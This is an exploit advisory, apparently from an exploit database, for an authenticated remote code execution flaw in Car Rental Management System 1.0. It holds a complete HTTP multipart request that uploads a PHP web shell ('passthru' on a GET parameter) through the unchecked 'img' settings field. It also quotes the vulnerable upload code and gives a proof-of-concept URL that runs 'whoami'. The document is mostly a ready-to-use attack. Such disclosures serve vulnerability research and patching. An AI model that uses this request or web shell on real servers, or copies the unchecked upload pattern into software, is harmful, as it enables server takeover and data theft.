@@ -1,0 +1,65 @@
+# Exploit Title: Car Rental Management System 1.0 - Remote Code Execution (Authenticated)
+# Date: 2020-11.13
+# Exploit Author: Mehmet Kelepçe / Gais Cyber Security
+# Author ID: 8763
+# Vendor Homepage: https://www.sourcecodester.com/php/14544/car-rental-management-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14544&title=Car+Rental+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested on: Apache2 - Windows 10
+
+Vulnerable param: img
+-------------------------------------------------------------------------
+POST /car_rental/admin/ajax.php?action=save_settings HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Accept: */*
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------30709612614161811513297969444
+Content-Length: 777
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/car_rental/admin/index.php?page=site_settings
+Cookie: setting=k; PHPSESSID=tsimparo2crmq2ibibnla5vean
+
+-----------------------------30709612614161811513297969444
+Content-Disposition: form-data; name="name"
+
+Car Rental Management System
+-----------------------------30709612614161811513297969444
+Content-Disposition: form-data; name="email"
+
+info@sample.comm
+-----------------------------30709612614161811513297969444
+Content-Disposition: form-data; name="contact"
+
++6948 8542 623
+-----------------------------30709612614161811513297969444
+Content-Disposition: form-data; name="about"
+
+content
+
+-----------------------------30709612614161811513297969444
+Content-Disposition: form-data; name="img"; filename="k.php"
+Content-Type: application/octet-stream
+
+<?php echo passthru($_GET['k']);?>
+-----------------------------30709612614161811513297969444--
+
+
+Source Code:
+
+admin\admin_class.php:
+--------------------------------------------------------------------
+                if($_FILES['img']['tmp_name'] != ''){
+                                                                                                                $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
+                                                                                                                $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/uploads/'. $fname);
+                                                                                                                $data .= ", avatar = '$fname' ";
+
+                                                }
+
+--------------------------------------------------------------------
+
+POC:
+http://{site]/admin/assets/uploads/{FILE}.php?k=whoami
